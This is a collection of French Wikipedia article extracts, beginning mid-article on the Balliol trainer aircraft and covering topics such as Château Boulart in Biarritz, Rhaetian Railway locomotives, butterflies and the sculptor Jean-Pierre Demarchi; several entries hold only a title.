En outre les Balliol et Sea Balliol furent mis en œuvre comme avions de soutien technique, voire de liaisons aériennes, par certains organismes parapublics britanniques comme l'Aeroplane and Armament Experimental Establishment ou encore l'Empire Test Pilots School, l'école des pilotes d'essais de la RAF. Certains Balliol y demeurant en service jusqu'à la fin des années 1960.
À l'export le Balliol ne fut commandé que par la seule Force aérienne royale de Ceylan qui fit l'acquisition en 1956 de dix Balliol T Mk.2. Ces avions furent utilisés jusqu'en 1983 pour l'entraînement primaire des futurs pilotes. Ils laissèrent la place à des Cessna 150 plus rudimentaires.
Avions construits.
L'usinage des avions fut réalisé par Boulton Paul et Blackburn Aircraft.

</doc>
<doc id="6806149" url="https://fr.wikipedia.org/wiki?curid=6806149" title="Extensions (album)">
Extensions (album)

Extensions est un album du Dave Holland Quartet.
Description.
Extensions fut nommé « album de l’année 1989 » par le magazine "DownBeat". On y trouve des collaborateurs habituels de Holland, comme Steve Coleman et Marvin Smitty Smith, mais aussi Kevin Eubanks, dont c’est le seul enregistrement avec le bassiste anglais (jusqu'à l'album "Another Land" en 2021). L’album est constitué de compositions des membres du quartet, deux par musicien (excepté le batteur), et se révèle comme une session post-bop de haute qualité.

</doc>
<doc id="6806150" url="https://fr.wikipedia.org/wiki?curid=6806150" title="Hagelsteen">
Hagelsteen



</doc>
<doc id="6806153" url="https://fr.wikipedia.org/wiki?curid=6806153" title="Emile Maggi">
Emile Maggi



</doc>
<doc id="6806154" url="https://fr.wikipedia.org/wiki?curid=6806154" title="Camille Bedin (SFIO)">
Camille Bedin (SFIO)



</doc>
<doc id="6806161" url="https://fr.wikipedia.org/wiki?curid=6806161" title="Goodwill Bridge">
Goodwill Bridge

Le Goodwill Bridge est une passerelle piétonne et cycliste sur le fleuve Brisbane à Brisbane, dans le Queensland, en Australie. Ce pont en acier long de a été ouvert à la circulation le .

</doc>
<doc id="6806173" url="https://fr.wikipedia.org/wiki?curid=6806173" title="Camissecla vesper">
Camissecla vesper

Camissecla vesper est une espèce de papillons de la famille des Lycaenidae, de la sous-famille des Theclinae et du genre "Camissecla".
Dénomination.
"Camissecla vesper" a été décrit par Herbert Druce en 1909 sous le nom initial de "Thecla vesper".
Synonyme : "Angulopis suarezensis" Johnson &amp; Kroenlein, 1993.
Description.
"Camissecla vesper" est un petit papillon aux pattes et aux antennes cerclés de blanc et noir, avec deux fines queues à chaque aile postérieure, une longue et une courte.
Le dessus est bleu clair métallisé bordé de marron grisé.
Le revers est beige orné d'une ligne postdiscale blanche et aux ailes postérieures de deux grosocelles orange pupillés de noir, un entre les queues, l'autre en position anale
Écologie et distribution.
"Camissecla vesper" est présent en Colombie, en Équateur, au Pérou et en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6806174" url="https://fr.wikipedia.org/wiki?curid=6806174" title="Ministres de Henri IV">
Ministres de Henri IV



</doc>
<doc id="6806179" url="https://fr.wikipedia.org/wiki?curid=6806179" title="Relais 4 x 400 m masculin">
Relais 4 x 400 m masculin



</doc>
<doc id="6806180" url="https://fr.wikipedia.org/wiki?curid=6806180" title="Relais 4 x 400 m féminin">
Relais 4 x 400 m féminin



</doc>
<doc id="6806184" url="https://fr.wikipedia.org/wiki?curid=6806184" title="Relais 4 x 100 m masculin">
Relais 4 x 100 m masculin



</doc>
<doc id="6806185" url="https://fr.wikipedia.org/wiki?curid=6806185" title="Relais 4 x 100 m féminin">
Relais 4 x 100 m féminin



</doc>
<doc id="6806189" url="https://fr.wikipedia.org/wiki?curid=6806189" title="Anvil of Dawn">
Anvil of Dawn

Anvil of Dawn est un jeu vidéo de type "dungeon crawler", situé dans un monde médiéval-fantastique, développé par DreamForge Intertainment et édité en 1995 par New World Computing. Le jeu n'est pas traduit en français (dans cet article, des notes indiquent les termes employés en cours de partie).
Synopsis.
Le monde de " est envahi par un seigneur de guerre devenu surpuissant grâce au cadeau d'un dieu maléfique. Les forces du bien sont balayées ; leur dernier espoir réside dans cinq aventuriers envoyés à la recherche de l'objet qui confère son invincibilité à leur ennemi.
Le joueur incarne l'un de ces héros sur qui repose le destin du monde : il devra réunir les éléments qui permettront de construire un coffre magique, qui à son tour permettra de transporter l'artefact maléfique jusqu'à l'endroit où les dieux ont forgé le monde, appelé ", puis de le détruire.
Système de jeu.
Le joueur choisit d'abord un personnage parmi cinq déjà prédéfinis, puis en modifie éventuellement les caractéristiques : force, endurance, agilité, et puissance, qui déterminent le nombre de points de vie du personnage, ses talents au combat, ses capacités en magie. Chaque personnage possède quatre compétences de combat et sept compétences de magie à leur niveau le plus bas.
L'aventure commence alors dans un château, où le joueur se familiarise avec les bases du jeu, obtient une arme, et apprend ses deux premiers sorts. Il trouvera ensuite, dans différents donjons, des potions et des objets qui amélioreront ses caractéristiques, ou qui lui permettront de mieux se battre ou de lancer des sortilèges sans dépenser de points de magie (armes et armures magiques, pendentifs enchantés, nouveaux sorts). Les points d'expérience, qui permettent de progresser niveau par niveau, ne sont acquis que par la pratique.
Un système d'endurance limite les possibilités d'utiliser trop fréquemment certains équipements. Ainsi, un personnage ayant peu d'endurance préfèrera utiliser une arme légère plutôt qu'une arme lourde, afin de ne pas s'épuiser trop rapidement. De plus, il n'existe pas de système de repos. Le personnage récupère lentement son endurance et sa magie avec le temps, et peut utiliser des potions ou sacrifier un objet sur un autel pour récupérer plus rapidement. Par conséquent, il est préférable, surtout pour un personnage axé sur la magie, d'utiliser les sortilèges à bon escient.
Le jeu se contrôle essentiellement à la souris ; au clavier, les touches principales sont F1 (aide) et les touches fléchées (mouvements). Les déplacements se font case par case, en vision subjective, avec un système de cartographie automatique. Les dialogues s'effectuent par choix de mots clés. Un journal enregistre les événements importants.
Le jeu possède trois fins différentes, en fonction d'un choix effectué à la fin du jeu, et de l'utilisation ou non d'un objet et d'un sort.

</doc>
<doc id="6806212" url="https://fr.wikipedia.org/wiki?curid=6806212" title="Music from Two Basses">
Music from Two Basses

 est un album de Dave Holland et Barre Phillips.
Description.
Comme son titre le suggère, cet album est la rencontre de deux bassistes, Dave Holland et Barre Phillips, qui jouent sans accompagnement. Ce rare concept anti-commercial et exigeant pour l’auditeur parvient néanmoins à séduire grâce à la communication intime de styles de jeu très différents mais complémentaires et un dialogue permanent.

</doc>
<doc id="6806227" url="https://fr.wikipedia.org/wiki?curid=6806227" title="Acontias rubrocaudatus">
Acontias rubrocaudatus



</doc>
<doc id="6806233" url="https://fr.wikipedia.org/wiki?curid=6806233" title="Enos falerina">
Enos falerina

Enos falerina est une espèce de lépidoptères (papillons) de la famille des Lycaenidae, sous-famille des Theclinae et du genre "Enos".
Dénomination.
"Enos falerina" a été décrit par William Chapman Hewitson en 1867, sous le nom initial de "Thecla falerina".
Synonyme : "Falerinota falerina", Faynel, Brévignon &amp; Johnson, 2003.
Nom vernaculaire.
"Enos falerina" se nomme Falerina Hairstreak en anglais.
Description.
"Enos falerina" est un petit papillon aux antennes et aux pattes annelées de blanc et de marron, avec deux fines queues, une longue et une très courte à chaque aile postérieure.
Le dessus du mâle est bleu métallisélargement bordé de marron.
Le revers est blanc, orné aux ailes antérieures et aux ailes postérieures d'une discrète fine ligne postdiscale beige, avec, aux ailes postérieures, deux gros ocelles rouge pupillés de noir entre les deux queues et à l'angle anal.
Écologie et distribution.
"Enos falerina" est présent au Mexique, au Guatemala, en Colombie, au Venezuela, au Pérou, au Surinam, en Guyana et en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6806239" url="https://fr.wikipedia.org/wiki?curid=6806239" title="Kinga (peuple)">
Kinga (peuple)

Les Kinga sont un peuple d'Afrique de l'Est établi au sud-ouest de la Tanzanie, dans les monts Kipengere (ou monts Livingstone).
Ethnonymie.
Selon les sources, on observe parfois la variante Wakinga.
Les Kinga sont traditionnellement voués à la culture du millet, des haricots, de la banane. Ils tirent du bambou une bière passablement alcoolisée, et depuis 1905 ils cultivent l'avoine et la pomme de terre. Ils peuplent les Monts Livingstone et élèvent quelques milliers d'ovins. Le peuple voisin des Nyakyusa les considèrent comme des étrangers : des guerriers qui s'allièrent avec eux contre les colons allemands lors de la révolte de Konde, et d'habiles forgerons.
Métallurgie.
Le fer étant une ressource rare pour les Nyakyusa, ils ont longtemps prêté des connaissances secrètes aux forgerons Kinga. Lors de l'invasion des Ngoni, ils avaient pris conscience de l'impuissance de leurs pointes de lances en bois contre des boucliers de bois épais : ils obtinrent des Kinga la fourniture de fers de lance. Les Kinga utilisaient des bas-fourneaux pour produire une fonte poreuse en évacuant graduellement les scories. Ils martelaient la fonte à chaud pour en tirer un fer aciéré de qualité fort aléatoire. Avec une tonne de charbon et un long apprentissage pour fabriquer houes.
Croyances.
Les prêtres Kinga revendiquent une longue tradition, antérieure même à leur organisation tribale. Ils pratiquent volontiers une forme de radiesthésie. Les Nyakyusa accueillaient annuellement les pèlerins Kinga lorsqu'ils descendaient la montagne pour vénérer le sanctuaire de Lwenbe.
Langue.
Leur langue est le kinga, une langue bantoue dont le nombre de locuteurs était estimé à en 2003.

</doc>
<doc id="6806240" url="https://fr.wikipedia.org/wiki?curid=6806240" title="Trouble Man">
Trouble Man

 peut faire référence à :

</doc>
<doc id="6806241" url="https://fr.wikipedia.org/wiki?curid=6806241" title="Scelotes fierinensis">
Scelotes fierinensis



</doc>
<doc id="6806250" url="https://fr.wikipedia.org/wiki?curid=6806250" title="Chapelle impériale de Biarritz">
Chapelle impériale de Biarritz

La chapelle impériale de Biarritz est un édifice religieux catholique dont la construction, qui s'étala de 1864 à 1866, fut confiée à Émile Boeswillwald. Elle est située à Biarritz (avenue de la Marne), dans le département français des Pyrénées-Atlantiques en région Nouvelle-Aquitaine, et constitue l'unique vestige immobilier de la villégiature impériale dans la ville.
Histoire.
La chapelle est classée aux monuments historiques depuis 1981.
Bâtie en 1864 à la demande impériale d'Eugénie de Montijo, épouse de Napoléon III, cette chapelle mêlant harmonieusement style roman-byzantin et hispano-mauresque a été dédiée à la vierge noire mexicaine Notre-Dame de Guadalupe.

</doc>
<doc id="6806253" url="https://fr.wikipedia.org/wiki?curid=6806253" title="Unité urbaine de Sète">
Unité urbaine de Sète

L'unité urbaine de Sète est une unité urbaine française centrée sur les communes de Sète, ville portuaire à l'ouest du golfe du Lion, et Frontignan, dans l'Hérault, au cœur de la troisième agglomération de ce département. 
Données générales.
Dans le zonage réalisé par l'Insee en 1999, l'unité urbaine était composée de quatre communes.
Dans le zonage réalisé en 2010, l'unité urbaine était composée de sept communes, les communes de Gigean, Montbazin et Poussan ayant été ajoutées au périmètre.
Dans le zonage réalisé en 2020, elle est composée des sept mêmes communes.
En , avec , elle représente la unité urbaine du département de l'Hérault, après l'unité urbaine de Béziers ( départemental) et avant celle de Lunel ( départemental). Elle occupe le dans la région Occitanie, après l'unité urbaine de Béziers ( régional) et avant l'unité urbaine de Montauban ( régional).
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 2,27 % du territoire départemental mais, par sa population, elle regroupe 7,78 % de la population du département de l'Hérault.
Composition 2020 de l'unité urbaine.
Elle est composée des sept communes suivantes :

</doc>
<doc id="6806256" url="https://fr.wikipedia.org/wiki?curid=6806256" title="Politique du pays de Galles">
Politique du pays de Galles



</doc>
<doc id="6806257" url="https://fr.wikipedia.org/wiki?curid=6806257" title="Système politique de l'Écosse">
Système politique de l'Écosse



</doc>
<doc id="6806270" url="https://fr.wikipedia.org/wiki?curid=6806270" title="Château Boulart">
Château Boulart

Demeure privée, le château Boulart s'élève à une hauteur de soixante-trois mètres d’altitude à Biarritz, dans le département français des Pyrénées-Atlantiques en région Nouvelle-Aquitaine. Conçu dans le style éclectique qui a cours dans le dernier quart du par l’un des architectes du Palais de Justice à Paris, Joseph Louis Duc, il conserve aujourd’hui l’intégralité des caractéristiques architecturales et les éléments décoratifs majeurs de la construction d’origine.
Les façades et la toiture du bâtiment ont été inscrites à l’Inventaire supplémentaire des monuments historiques le .
Histoire.
Les différentes dénominations.
Le château Boulart est connu sous différentes dénominations. Durant sa construction, il est identifié par ses architectes comme Villa à Biarritz. Également villa Boulart ‒ une dénomination encore utilisée aujourd’hui ‒, du nom de Charles Boulart, le maître de l’ouvrage. Lui-même et ses descendants l’appellent villa Belle Fontaine. Au cours de son édification, la richesse de l’architecture et de la décoration le font dénommer par les Biarrots Folie Boulart, le nom que ses propriétaires actuels ont conservé.
Charles Boulart (1828-1891) et Marthe Darricau (1843-1913).
La construction de la villa a été décidée par Charles Boulart qui achète en 1872 un terrain de cinq hectares à Biarritz.
Charles Eucher Boulart est né à Linxe dans les Landes, où s’élève le château familial. Docteur en droit, il devient maître de forges à Castets en s’associant à un oncle. Propriétaire de plus de treize mille hectares de pins, il devient maire de Linxe, conseiller général des Landes et est élu député du canton de Castets en 1876 et jusqu’en 1881.
Charles Boulart épouse en 1865 Marthe Darricau, l’aînée d’une famille protestante bordelaise. Elle est la fille de Charles Darricau (1808-1868), intendant général de Napoléon III et petite-fille du général de la Grande Armée Augustin Darricau (1773-1819) anobli par l’Empereur en 1808. Tous deux sont proches de la cour impériale.
Grâce à l’impératrice Eugénie, Biarritz est devenue une villégiature à la mode, fréquentée par des personnalités prestigieuses. Napoléon III y a fait construire la Villa Eugénie à partir de 1854 (elle sera détruite par un incendie en 1903). La reine Victoria, amie de l’Impératrice, lui rend visite. Têtes couronnées, grands-ducs et princesses russes, hommes de lettres, comme qu'Oscar Wilde ou Anton Tchekhov, s’y pressent.
Les architectes.
Joseph Louis Duc (1802-1879).
Charles Boulart confie la construction de sa Villa à Joseph Louis Duc, l’un des grands architectes français du siècle. Lauréat du Grand Prix de Rome en 1825, Duc séjourne à la Villa Médicis où il se lie avec Félix Duban, Léon Vaudoyer et Henri Labrouste. À son retour de Rome, il achève l’élévation de la « colonne de Juillet » place de la Bastille. Il est alors nommé architecte du Palais de Justice et participe à son agrandissement, en particulier côté Cour de Cassation. Membre de l’Institut en 1866, il reçoit en 1869 le Grand Prix d’architecture que Napoléon III vient de créer et dont il restera le seul lauréat. L’incendie que provoque la Commune de Paris en 1871 dévaste une grande partie du Palais de Justice dont la Cour de Cassation à peine achevée, et Duc en entreprend alors la reconstruction. Le vestibule de Harlay et sa façade sur la place Dauphine sont notamment son œuvre.
Le château Boulart est le seul chantier privé que mène Duc, à l’exception de la villa qu’il s’est construite dans un style oriental à Croissy-sur-Seine (détruite aujourd’hui). Lorsque Duc meurt en 1879, le château Boulart n’est pas totalement achevé.
(Louis) François Roux (1838-1921).
Pour la « Villa à Biarritz », Duc s’adjoint un jeune architecte, François Roux, qui l’assiste à partir de 1868 à la Cour de Cassation comme premier inspecteur des travaux. Après l’École des Beaux-Arts de Lyon où il a obtenu un Grand prix d’architecture, François Roux a intégré l’atelier de Charles Questel à l’École des Beaux-Arts de Paris en 1862. Lors de l’Exposition Universelle de 1867, il bâtit un pavillon des Cachemires et peint 25 aquarelles pour les « Albums du Parc » remis à Napoléon III. Il travaille avec Duc puis Coquart à la Cour de Cassation jusqu’en 1884 où il est nommé architecte en chef de l’Institut National des Jeunes Aveugles. Il mène en parallèle de nombreux chantiers personnels, dont un hôtel particulier avenue de l’Alma à Paris en même temps que le château Boulart, et travaille à l’invention d’un avion à ailes battantes.
À la mort de Duc, Roux poursuit la construction du château Boulart jusqu’en 1881.
Les occupants successifs.
Si la date d’entrée de la famille Boulart dans les lieux n’est pas avérée, on retient généralement l’année 1883. Charles Boulart meurt en 1891, et Marthe, prenant la succession de son mari à la tête des forges de Castets, met le château en location. Parmi les locataires : l’historien anglais J.E. Courtenay Bodley, ami d’Oscar Wilde, de 1902 à 1904 ‒ les époux Bodley reçoivent le roi de Suède Oscar II ‒ ; en 1905, un industriel américain, John G.A. Leishman, ancien président de Carnegie Steel Comp., ambassadeur des États-Unis à Constantinople, Rome puis Berlin ‒ il y reçoit le roi d’Angleterre ‒ ; en 1908, une riche Américaine, Mrs Amory Moore.
Le château est occupé, de 1915 à 1924, par un Américain francophile, L.R. Wanamaker, héritier d’une chaîne de grands magasins, et qui mène une intense activité de mécénat. En 1917, le château Boulart est mis par lui à la disposition de la Croix-Rouge américaine pour l’accueil de femmes et d’enfants réfugiés. Il acquiert la propriété en 1919.
En 1930, le château Boulart est occupé par l’institution Notre-Dame de Sion qui y ouvre un collège de jeunes filles, puis un pensionnat de jeunes filles (avec aménagement et surélévation de l’ancien gymnase qui deviendra improprement « Villa » Sion), puis un collège mixte, jusqu’à sa vente en 1974.
Peu à peu le domaine qui occupait cinq hectares a été morcelé et vendu en lots, et le parc s’est considérablement réduit. Le château Boulart est acquis par Pierre et Brigitte Delalonde fin 2015.
Architecture.
Conception générale.
Les cinquante années d’expérience de l’architecte Joseph Louis Duc, sa maîtrise de la construction monumentale au Palais de Justice servent ici à la conception d’une villa au programme complexe mais cohérent qui révèle un sens aigu de la mise en scène. L’ensemble s’apparente à l’éclectisme de l’époque. Sur un plan carré, les quatre façades décorées de sculptures se déploient en apportant différentes ruptures à la symétrie : accidents et saillies, balcon, tour, loggia, perron, porche néo-Renaissance, bow-window. Un belvédère octogonal au-dessus de l’entrée donne une vue à trois cent soixante degrés sur le paysage. Après un porche monumental, un escalier voûté style Renaissance s’ouvre sur un atrium à huit colonnes orné d’une fontaine, qui se développe sur trois niveaux et est éclairé par un vitrail en triptyque en trompe-l’œil. Le grand escalier intérieur, à double révolution, est bordé d’une rampe en fer forgé décorée de volutes et de dragons ailés. Une coupole d’inspiration italienne dans laquelle s’ouvrent huit paires de vitraux surmonte l’espace.
La villa répond par son plan et par son équipement aux exigences d’un confort moderne et aux besoins d’une famille de la haute société : salons, bibliothèque, oratoire, billard, étage pour les domestiques, sous-sol avec cuisine, caves, chais, laverie et autres annexes, chauffage central à air chaud par un calorifère placé sous le perron intérieur, citerne souterraine de quatre cents mètres cubes, monte-charges, escaliers de service, conduit vers un égout pour les ordures, etc. Des dépendances complètent la propriété : pavillon de gardien à la grille d’honneur, écuries, pavillon destiné au théâtre et au sport.
Artistes et artisans ont fait l’objet d’un choix minutieux (voir ci-dessous). Les matériaux ont été sélectionnés avec soin.
L’ensemble de ces caractéristiques permettent à l’architecte Claude Laroche d’y voir « un unicum entre les unicums, un élément important de l’architecture française de son temps » ("Le Festin").
Deux archives documentent particulièrement cette construction :
Marbres et pierres.
L’abondance de l’usage du marbre est l’une des caractéristiques du château Boulart, il est en particulier doté de trente-deux colonnes et de vingt cheminées en marbre.
L’article de "l’Encyclopédie d’Architecture" répertorie certains de ces marbres. Un inventaire complet en a été fait en 2016-2017 par J. Dubarry de Lassale qui a dénombré les trente-quatre carrières dont ils sont extraits.
On peut mentionner :
Mosaïques.
Deux cent quatre-vingt-dix mètres carrés de mosaïques recouvrent en partie les sols du château Boulart : atrium, vestibule, espaces de transition (seuils, paliers), oratoire et donjon. Elles ont été identifiées par la spécialiste Danielle Justes comme le travail de mosaïstes italiens originaires du Frioul et de Vénétie, l’atelier de Gian Domenico Facchina, qui a essaimé à travers l’Europe dont la France. Ces mosaïques sont dans un état de conservation extraordinaire compte tenu de leur dissimulation sous les sols jusqu’à leur découverte en 1987 puis en 2016.
Sont particulièrement remarquables : le motif central de l’atrium dessinant huit arcades avec feuilles d’acanthe et rinceaux, sceptres enflammés, et le ceignant, une frise rouge et verte cernée de noir ; des médaillons en volutes entourant les grilles de chauffage ; un tapis de fleurs sur le palier de l’escalier avec feuilles d’acanthe vertes, rinceaux en tesselles jaunes, bandes noires et jaunes, le monogramme B ; dans la salle en haut du donjon, une fleur stylisée entourée d’arceaux en volutes ; au premier étage, une mosaïque blanche semée de croisettes noires et rouges et des rinceaux à volutes et feuilles d’acanthe ; dans l’oratoire, un agneau souriant entouré d’un semis à croisettes noires sur fond blanc.
Vitraux.
L’une des pièces les plus remarquables du château et encore en place est constituée par le grand vitrail en triptyque situé à mi-hauteur de l’escalier d’honneur sur la façade ouest. Daté de 1871, il est signé du maître verrier Eugène Oudinot de la Faverie (1827-1889), médaille d’or à l’Exposition Universelle de 1878. Ses trois baies en plein cintre représentent un jardin de treillage peint en trompe-l’œil : décor végétal et structures de treillage aériennes. Sur le plan technique, l’artiste, qui divise la surface en rectangles de taille identique assemblés au plomb, utilise ici un procédé d’émail breveté en 1879 et qui fait du vitrail un écran translucide à l’aspect glacé et poudré favorisant la dispersion de la lumière.
Autre création d’Oudinot de la Faverie : les huit paires de vitraux qui éclairent la coupole. Ils représentent un motif médiéval dit « en cuir découpé » très prisé durant la Renaissance, auquel est intégré le monogramme « B » pour Boulart.
Dans le même temps, Oudinot crée un vitrail pour l’hôtel particulier du comte de Camondo à Paris ; il exporte sa technique aux États-Unis où il crée en 1883-1884 cinq verrières en architecture de treillage pour l’architecte américain Richard Morris Hunt, auteur des cartons du triptyque de Boulart (cf. thèse d'Amélie Duntze-Ouvry, Université Blaise Pascal, Clermont II, 2017).
Peintures.
Le plafond du Grand Salon était décoré à l’origine d’une grande peinture centrale entourée de quatre cartouches. À l’arrivée du dernier propriétaire (fin 2015), le motif central alors visible, une fresque d’inspiration saint-sulpicienne postérieure à la construction du Château, a été déposé dans l’espoir de remettre au jour la peinture initiale ; mais il n’en subsistait aucune trace. Les quatre cartouches qui étaient alors recouverts d’une épaisse couche de peinture bleu ciel, ont été dégagés au cours de 2016-2017 et ont laissé apparaître quatre toiles d’inspiration mythologique : "Diane endormie, Diane au repos, Pâtre jouant de la flûte, Le Chasseur Actéon surpris par Diane".
Dans l’angle d’un cartouche, le prénom Tony, et les restes de quelques lettres du nom de Robert Fleury ont permis de lancer des recherches et d’attribuer ces quatre peintures à Tony Robert-Fleury (1837-1911). Fils du peintre Joseph-Nicolas Robert-Fleury, qui a dirigé la Villa Médicis à Rome, il expose au Salon de Paris en 1866 et se spécialise dans les grandes compositions historiques et les portraits ; il sera président de la Société des Artistes français et de la Fondation Taylor.
Restauration.
Après leur acquisition en , les propriétaires actuels du Château ont fait procéder à une minutieuse restauration pour restituer au lieu son état d’origine. Ce travail a impliqué la recherche des documents de l’époque encore existants ou de certains éléments disparus à la suite de ventes. On peut mentionner comme étapes saillantes de la restauration : le dévoilement des sculptures des écoinçons du fronton nord, le dégagement des cartouches du plafond du Grand Salon, la remise en état des mosaïques abîmées surtout dans les lieux de passage, la restauration des vitraux d’Eugène Oudinot de la Faverie (triptyque et vitraux de la coupole), la reconstitution des crêtes et poinçons de la toiture de Monduit, la restitution des couleurs de la coupole, la remise en état de la rampe du grand escalier, la réparation de parquets en marqueterie.

</doc>
<doc id="6806272" url="https://fr.wikipedia.org/wiki?curid=6806272" title="RhB Ge 4/4 II">
RhB Ge 4/4 II

Les Ge 4/4 II sont des locomotives électriques de ligne à voie métrique de type Bo'Bo' utilisées par les Chemins de fer rhétiques, qui sont le principal réseau de chemin de fer du canton des Grisons en Suisse.
Leur immatriculation est ainsi car ce sont des locomotives électriques à voie métrique (Ge). Elles sont de type Bo'Bo' (4/4) et c'est la deuxième série de la compagnie à avoir ces caractéristiques (II).
Histoire.
Les premières unités sont commandées en . Ces machines ont un aspect similaire au Re 4/4 II des CFF, c'est pour cela qu'ils sont surnommés « Bonsaï Re 4/4 » . La première série de locomotives à thyristors va être livrée dans le courant de l'année 1973. Elle est composée des machines 611 à 620. Pour faire face à l'introduction de l'horaire cadencé en Suisse, le RhB commande une deuxième série de 13 machines les 621 à 633 en 1982 elles seront livrées entre 1984 et 1985. Elles sont alors capable de tracter un train de 185 tonnes et 400 tonnes en unité multiples. Elles sont équipées pour la conduite par réversibilité avec les voitures 1751-1758 et plus récemment avec les 1721-1723 Ces machines étaient à l'origine en livrée verte puis elles sont passées en livrée rouge. Elles ont également reçu de nouveaux feux rectangulaires.
Services.
Toutes les machines sont entretenues par l'atelier de Landquart (Grisons). Elles sont omniprésentes sur tout le réseau sauf sur la ligne de la Bernina. On peut les voir aussi bien en tête d'une rame réversible que d'un train de fret. Elles assurent la traction/pousse des rames réversibles entre Pontresina et Scuol-Tarasp. Elles assurent également les RegioExpress Disentis/Müster-Chur-Landquart-Küblis-Scuol Tarasp ainsi que les trains de fret sur l'ensemble des lignes du réseau. 

</doc>
<doc id="6806274" url="https://fr.wikipedia.org/wiki?curid=6806274" title="Politique de la Rome antique">
Politique de la Rome antique



</doc>
<doc id="6806276" url="https://fr.wikipedia.org/wiki?curid=6806276" title="Jean-Pierre Demarchi">
Jean-Pierre Demarchi

Jean-Pierre Demarchi, né à Oran (Algérie) en 1928 et mort en 1979, est un sculpteur et médailleur français.
Il s’inspire de la nature et la recompose à la limite de l’abstrait. Il est aussi reconnu pour les médailles qu'il réalise avec la Monnaie de Paris. En parallèle de son œuvre d'artiste indépendant, il est le directeur artistique de la cristallerie Daum. Dans ce cadre il développe la réalisation de sculptures en pâte de verre et crée des collections d’objets usuels.
Biographie.
Né à Oran en Algérie en 1928 de parents italo-suisse, Jean-Pierre Demarchi y fait ses études jusqu’au baccalauréat. Intéressé par les arts plastiques, il s'installe en Métropole. En 1948,
il s'inscrit à l'École nationale supérieure des arts décoratifs à Paris. Ami et condisciple de Maurice Legendre, il est élève de Robert Couturier (1905-2008), directeur de l'atelier de sculpture. Ce dernier lui propose une collaboration en 1952 dès sa sortie de l'École.
Passionné par les différentes formes de recherche plastique, Jean-Pierre Demarchi développe rapidement des relations artistiques étroites avec ses professeurs Marc Saint-Saëns, Louis Dideron et Raymond Martin, ainsi qu’avec les décorateurs Jacques Dumond et Maxime Old.
Il expose régulièrement :
Les clients institutionnels font appel à ses talents :
En 1962, à la suite du concours « 20 ans de médailles » de la Monnaie de Paris, Jean-Pierre Demarchi développe en collaboration avec cette dernière un important œuvre de médailleur.
En 1967, la cristallerie Daum lui propose le poste de directeur artistique qu'il accepte tout en gardant son activité de sculpteur indépendant. Il est à l’origine des sculptures en pâte de verre réalisées par Daum et favorise les collaborations avec plusieurs artistes de renom dont Salvador Dalí, César, Couturier, Legendre, Lhoste, Badord, Gérard Koch ou Pierre Dmitrienko.
Style et œuvres.
L’œuvre de Jean-Pierre Demarchi se décompose en six domaines : œuvres monumentales, sculptures personnelles, bas-reliefs, médailles, sculptures en pâte de verre, collections Daum.
Œuvres monumentales.
Cette ligne d’inspiration est très précoce chez lui, elle correspond à la majorité de ses commandes institutionnelles. Elle a été largement exposée et remarquée des critiques d’art qui en disent : . En effet, ses œuvres se caractérisent par un style dynamique et spontané laissant volontairement les techniques de l’ébauche apparaître sur le rendu final.
Il est l'auteur d"'Icare" (Vigneux), "Icare" (musée Rodin), "Oiseau monumental" (lycée Pasteur, Oissel-sur-Seine), sculpture du lycée Laetizia Bonaparte (Ajaccio), "Monument aux déportés de Dachau", une sculpture animée de jeux d'eau (château de Senailly), des bas-reliefs (Rouen), une cheminée (Chaville), "Croix" de la chapelle Sainte-Clotilde (Paris), "Nef" symbolique de la ville de Paris pour l'Exposition universelle de Bruxelles.
Autres sculptures.
Cette ligne a aussi des racines particulièrement précoces avec notamment le "Couple" réalisé dès 1951. C’est dans ses sculptures de taille assez modeste que la sensibilité de Jean-Pierre Demarchi s’exprime avec le plus de liberté. Les modelés des corps de femmes, leur découpe ou encore le rendu de ses oiseaux métalliques sont autant de témoins de la richesse de sa technique et de ses émotions. Ces œuvres sont l’aboutissement de préoccupations artistiques inspirées de celles d'Alberto Giacometti, qu’il n’a pourtant jamais fréquenté.
Il est l'auteur d'œuvres (non localisées) comme "Couple" (1951), "Femme en équilibre, allongée, debout, à genoux, alanguie", "L'Oiseau blessé" (1958), "Le Dindon", "Le Taureau", "Le Taureau porté", "Icare" (1970), "Le Vieil Homme", "L'Homme arborescent" (1964), "La Forêt pétrifiée" (1973).
Bas-reliefs.
On retrouve sur les bas reliefs de Jean-Pierre Demarchi la façon de traiter le métal et les sujets qu’il utilise pour ses sculptures « personnelles ». Il joue avec autant de bonheur de la même palette d’inspiration allant du figuratif stylisé à l’abstraction. Le terme bas-relief est ici utilisé à la limite de son sens technique puisque détachés du support mural, il s’agit davantage de haut-relief.
Panneaux pour le paquebot "Flandre" (1951) ; panneau décoratif pour la triennale de Paris et bas-relief du foyer du théâtre du Mans (1959) à la demande de Jacques Dumond ; bas-reliefs pour la salle du conseil municipal et la halle aux toiles de la ville de Rouen (1961) à la demande de Maxime Old.
Médailles.
La production de médailles de Jean-Pierre Demarchi est abondante. Sa dualité pour le figuratif et l’abstrait, s’y retrouve souvent à l'avers comme au revers d’une même médaille. Ses recherches telles l’homme arborescent ou les formes féminines s’y expriment avec la délicatesse du ciselé ou du modelé qui caractérise son travail. Certaines œuvres énigmatiques visent avant tout à développer l’imaginaire du spectateur. Ses œuvres sont notamment exposées au musée de la Monnaie de Paris et dans des musées de Rome, Helsinki, Oslo.
Elles commémorent des évènements exceptionnels comme en 1962 celle de l'électrification de la ligne Paris Marseille, et celle célébrant en 1965 les 20 ans de la monnaie de Paris. Certaines sont personnalisées comme celles remises au personnel lors des 50 ans du crédit national. Jean Pierre Demarchi conçoit des médailles pour les institutions (ministères de l'Intérieur, de la Jeunesse et des Sports). 
Dans la salle du conseil municipal de l'hôtel de ville de Rouen, ses médaillons ou bas-reliefs commémorent l'histoire de la ville. 
En 1967, lors de l'exposition internationale de la médaille actuelle à l'hôtel de la Monnaie, il présente deux de ses créations, un "Icare" réalisé en 1964 et une médaille frappée en 1966 à l'intention du ministère de l'Agriculture.
Galerie.
Sculptures en pâte de verre.
Cette ligne prend son essor au moment de l’implication de Jean-Pierre Demarchi au sein de la cristallerie Daum. C’est lui qui a l’idée d’utiliser la matière et la technique pour réaliser de véritables sculptures. Il développe les subtilités de ce nouveau matériau, il tire de sa transparence modulable, de ses différents rendus (cristallisé, givré, teinté, ciselé…) une source d’inspiration nouvelle, expression artistique à part entière capable de répondre à ses recherches inassouvies. C’est un nouvel espace de liberté artistique qu’il explore et sur lequel il attire nombre de sculpteurs contemporains, notamment son maître Couturier, Dali et César.
